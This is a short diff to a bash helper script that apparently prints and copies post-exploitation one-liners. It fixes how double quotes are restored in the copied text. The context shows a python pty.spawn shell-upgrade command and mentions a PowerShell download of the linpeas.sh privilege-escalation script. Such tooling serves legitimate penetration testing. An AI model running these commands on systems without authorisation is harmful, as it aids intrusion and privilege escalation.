@@ -280,13 +280,13 @@ printf "\n\n		loads up a powershell command to download the file linpeas.sh from
 printf "\n"
 printf "$LINE" | sed s/\~/\"/g
 printf "\n\n"
-copy_lineexit "$LINE"
+copy_lineexit "$(printf "$LINE" | sed s/\~/\"/g)"
 ;;
 -pl3) LINE="python3 -c 'import pty; pty.spawn(~/bin/bash~)'"
 printf "\n"
 printf "$LINE" | sed s/\~/\"/g
 printf "\n\n"
-copy_lineexit "$LINE" 
+copy_lineexit "$(printf "$LINE" | sed s/\~/\"/g)" 
 ;;
 *) display_msg
 ;;
